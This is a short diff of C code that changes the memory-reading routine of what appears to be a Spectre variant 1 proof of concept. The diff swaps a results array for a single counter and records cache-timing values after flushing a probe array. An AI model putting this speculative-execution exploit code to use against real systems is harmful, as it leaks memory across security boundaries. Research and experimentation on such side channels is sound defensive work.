@@ -75,15 +75,12 @@ void victim_function(size_t x) {
 
 /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(size_t malicious_x, uint64_t timings[256]) {
-    static int results[256];
+    static int result = 0;
     int i, j, mix_i;
     unsigned int junk = 0;
     size_t training_x, x;
     register uint64_t time1, time2;
     volatile uint8_t *addr;
-    for (i = 0; i < 256; i++) {
-        results[i] = 0;
-    }
     /* Flush array2[256*(0..255)] from cache */
     for (i = 0; i < 256; i++) {
         _mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */
@@ -116,7 +113,7 @@ void readMemoryByte(size_t malicious_x, uint64_t timings[256]) {
         timings[mix_i] = time2;
     }
     
-    results[0] ^= junk; /* use junk so code above won’t get optimized out*/
+    result ^= junk; /* use junk so code above won’t get optimized out*/
 }
 
 
